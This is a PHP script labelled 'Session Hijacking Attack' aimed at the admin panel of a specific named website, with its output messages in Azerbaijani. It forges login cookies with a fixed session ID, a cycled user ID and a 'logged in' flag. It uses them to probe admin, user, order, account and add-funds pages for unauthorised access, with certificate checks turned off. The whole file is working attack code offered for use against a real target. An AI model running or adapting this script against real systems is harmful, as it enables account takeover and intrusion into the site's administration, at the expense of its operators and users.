<?php
/**
 * Session Hijacking Attack
 * Target: https://royzasmm.com.tr/admin/
 * Method: Cookie Manipulation
 */

class SessionHijack {
    private $target = "https://royzasmm.com.tr/admin/";
    private $baseUrl = "https://royzasmm.com.tr";
    
    // Test user IDs
    private $userIds = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
    
    // Test endpoints
    private $endpoints = [
        '/admin/',
        '/admin/dashboard',
        '/admin/users',
        '/admin/orders',
        '/dashboard',
        '/orders',
        '/account',
        '/addfunds'
    ];
    
    public function testSessionHijacking() {
        echo "=== SESSION HIJACKING ATTACK ===\n";
        echo "Target: {$this->target}\n";
        echo "Method: Cookie Manipulation\n\n";
        
        foreach ($this->userIds as $userId) {
            echo "Testing User ID: {$userId}\n";
            $this->testUserAccess($userId);
            echo "----------------------------------------\n";
            sleep(1);
        }
    }
    
    private function testUserAccess($userId) {
        $cookies = [
            "PHPSESSID=0dd217dff888e74d1d28eee839336307",
            "u_id={$userId}",
            "u_loginok=1"
        ];
        
        $cookieHeader = implode('; ', $cookies);
        
        foreach ($this->endpoints as $endpoint) {
            $url = $this->baseUrl . $endpoint;
            echo "  Testing: {$endpoint}\n";
            
            $response = $this->sendRequest($url, $cookieHeader);
            $this->analyzeAccess($response, $endpoint, $userId);
        }
    }
    
    private function sendRequest($url, $cookieHeader) {
        $ch = curl_init();
        
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTPHEADER => [
                "Cookie: {$cookieHeader}",
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language: en-US,en;q=0.5',
                'Accept-Encoding: gzip, deflate',
                'Connection: keep-alive'
            ],
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => false
        ]);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return [
            'body' => $response,
            'http_code' => $httpCode
        ];
    }
    
    private function analyzeAccess($response, $endpoint, $userId) {
        $body = $response['body'];
        $httpCode = $response['http_code'];
        
        echo "    HTTP Code: {$httpCode}\n";
        
        // Access granted
        if ($httpCode === 200) {
            if (strpos($body, "admin") !== false) {
                echo "    ✅ Admin Access: User ID {$userId} admin panelə giriş edə bilər!\n";
            } elseif (strpos($body, "dashboard") !== false) {
                echo "    ✅ Dashboard Access: User ID {$userId} dashboard-a giriş edə bilər!\n";
            } elseif (strpos($body, "orders") !== false) {
                echo "    ✅ Orders Access: User ID {$userId} sifarişlərə giriş edə bilər!\n";
            } else {
                echo "    ✅ Access Granted: User ID {$userId} {$endpoint} səhifəsinə giriş edə bilər!\n";
            }
        } elseif ($httpCode === 403) {
            echo "    ❌ Access Denied: User ID {$userId} {$endpoint} səhifəsinə giriş edə bilməz!\n";
        } elseif ($httpCode === 404) {
            echo "    ⚠️ Not Found: {$endpoint} səhifəsi tapılmadı!\n";
        } else {
            echo "    ⚠️ Unknown: HTTP Code {$httpCode}\n";
        }
        
        // Response length
        echo "    Response Length: " . strlen($body) . " bytes\n";
    }
    
    public function testAdminBypass() {
        echo "\n=== ADMIN PANEL BYPASS TEST ===\n";
        
        $adminCookies = [
            "PHPSESSID=0dd217dff888e74d1d28eee839336307",
            "u_id=1",
            "u_loginok=1"
        ];
        
        $cookieHeader = implode('; ', $adminCookies);
        
        foreach ($this->endpoints as $endpoint) {
            if (strpos($endpoint, 'admin') !== false) {
                $url = $this->baseUrl . $endpoint;
                echo "Testing Admin: {$endpoint}\n";
                
                $response = $this->sendRequest($url, $cookieHeader);
                $this->analyzeAdminAccess($response, $endpoint);
            }
        }
    }
    
    private function analyzeAdminAccess($response, $endpoint) {
        $body = $response['body'];
        $httpCode = $response['http_code'];
        
        echo "  HTTP Code: {$httpCode}\n";
        
        if ($httpCode === 200) {
            if (strpos($body, "login") !== false) {
                echo "  ⚠️ Login Form: Admin panelə giriş tələb olunur!\n";
            } else {
                echo "  ✅ Admin Access: Admin panelə giriş edildi!\n";
            }
        } else {
            echo "  ❌ Access Denied: HTTP Code {$httpCode}\n";
        }
    }
}

// Usage
if (php_sapi_name() === 'cli') {
    $hijack = new SessionHijack();
    $hijack->testSessionHijacking();
    $hijack->testAdminBypass();
} else {
    echo "Bu script terminal-də işlədilməlidir!";
}
?>